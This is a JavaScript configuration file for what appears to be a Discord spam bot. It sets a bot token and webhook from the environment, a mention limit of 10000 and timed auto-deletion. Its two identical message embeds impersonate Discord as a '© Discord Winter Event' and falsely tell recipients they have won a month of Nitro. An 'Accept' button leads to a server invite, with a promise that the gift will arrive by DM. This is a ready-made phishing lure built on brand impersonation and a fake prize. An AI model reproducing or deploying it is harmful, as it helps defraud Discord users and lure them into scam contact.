module.exports = {
    token: process.env.token,
    advanced: {
        limit: 5,
        leave: true
    },
    auto_delete: {
        enabled: true,
        interval_seconds: 43200
    },
    blacklist: [],
    mention_limit: 10000,
    webhook: process.env.webhook,
    icon: "https://polybit-apps.s3.amazonaws.com/stdlib/users/discord/profile/image.png",

    // Ana Embed (Nitro Ödülü)
    embed: [
        {
            embeds: [
                {
                    title: '<a:Verify_Blue:1355135777499119636>  | Redeem your 1 month of Discord Nitro!',
                    description: `**you won a Nitro Boost** ! 🎉\n\n> <:WhiteGift:1347326372615422094> | To claim your prize, click the button below.\n\n> \`1.\` Click **Accept**\n> \`2.\` Join the server\n> \`3.\` Your gift will be sent via **DMs** shortly!`,
                    color: 0x5b5bff,
                    footer: {
                        text: "© Discord Winter Event"
                    },
                    thumbnail: {
                        url: "https://cdn.discordapp.com/attachments/1347149052009123865/1347244192786681917/1268867386576994347.gif?ex=67cb1e6e&is=67c9ccee&hm=26fafcdc9e5de1f0849a4cbdf515698caca31135c9d4308b17ba2247a25f4d66&"
                    },
                    image: {
                        url: "https://media.discordapp.net/attachments/1236388019439800330/1256236688406220912/11111unknown.png?ex=6a49b056&is=6a485ed6&hm=a8ca6bd0e7c38620d64afc44bcccfb266de19a8cf44ec80b185899f50ce00c54&format=webp&quality=lossless&"
                    }
                }
            ],
            components: [
                {
                    type: 1,
                    components: [
                        {
                            type: 2,
                            label: "Accept",
                            style: 5,
                            emoji: {
                                name: "Discord",
                                id: "1364075075598417952",
                                animated: false
                            },
                            url: "https://discord.gg/MwRBgGGaam"
                        }
                    ]
                }
            ]
        }
    ],

    // embed2 (aynı embed, farklı bir olay için)
    embed2: [
        {
            embeds: [
                {
                    title: '<a:Verify_Blue:1355135777499119636>  | Redeem your 1 month of Discord Nitro!',
                    description: `**you won a Nitro Boost** ! 🎉\n\n> <:WhiteGift:1347326372615422094> | To claim your prize, click the button below.\n\n> \`1.\` Click **Accept**\n> \`2.\` Join the server\n> \`3.\` Your gift will be sent via **DMs** shortly!`,
                    color: 0x5b5bff,
                    footer: {
                        text: "© Discord Winter Event"
                    },
                    thumbnail: {
                        url: "https://cdn.discordapp.com/attachments/1347149052009123865/1347244192786681917/1268867386576994347.gif?ex=67cb1e6e&is=67c9ccee&hm=26fafcdc9e5de1f0849a4cbdf515698caca31135c9d4308b17ba2247a25f4d66&"
                    },
                    image: {
                        url: "https://media.discordapp.net/attachments/1236388019439800330/1256236688406220912/11111unknown.png?ex=6a49b056&is=6a485ed6&hm=a8ca6bd0e7c38620d64afc44bcccfb266de19a8cf44ec80b185899f50ce00c54&format=webp&quality=lossless&"
                    }
                }
            ],
            components: [
                {
                    type: 1,
                    components: [
                        {
                            type: 2,
                            label: "Accept",
                            style: 5,
                            emoji: {
                                name: "Discord",
                                id: "1364075075598417952",
                                animated: false
                            },
                            url: "https://discord.gg/MwRBgGGaam"
                        }
                    ]
                }
            ]
        }
    ]
};
